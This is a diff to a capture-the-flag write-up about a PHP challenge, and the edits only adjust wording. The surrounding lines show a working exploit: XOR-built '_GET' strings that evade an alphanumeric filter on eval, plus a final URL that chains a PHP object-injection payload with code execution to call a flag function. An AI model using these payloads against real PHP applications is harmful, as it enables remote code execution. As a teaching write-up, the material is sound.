@@ -147,7 +147,7 @@ I found two interesting websites:
 
 In the second website, there is the same scenario of the challenge, so I used it to craft my payload.
 
-Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric char.
+Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.
 
 ```php
 $_="`{{{"^"?<>/"; // This is: "_GET" string.
@@ -165,7 +165,7 @@ So the complete payload that will be executed by the `eval` instruction will be 
 $_="`{{{"^"?<>/";${$_}[_]();
 ```
 
-Putting everything together, you can craft the final URL to invoke. The last thing to do is to specify the HTTP GET parameter called `_` where the name of the function to call will be specified.
+Putting everything together, you can craft the final URL to invoke. The last thing to do is to specify the HTTP GET parameter called `_` where the name of the function to call will be passed.
 
 ```
 http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}&caption=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&_=echoFlag
